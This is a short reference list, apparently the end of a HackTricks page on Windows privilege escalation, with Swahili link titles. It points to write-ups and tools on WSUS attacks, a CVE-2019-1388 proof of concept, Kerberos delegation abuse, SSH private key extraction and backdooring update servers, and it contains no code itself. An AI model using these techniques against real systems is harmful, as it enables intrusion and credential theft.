- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Local Privilege Escalation ya Windows 10 iliyotolewa siku hiyo hiyo](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya Picha Yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa Ssh Private Keys kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kugeuza Seva za Enterprise za Usasishaji kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kugeuza Seva za Enterprise za Usasishaji kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
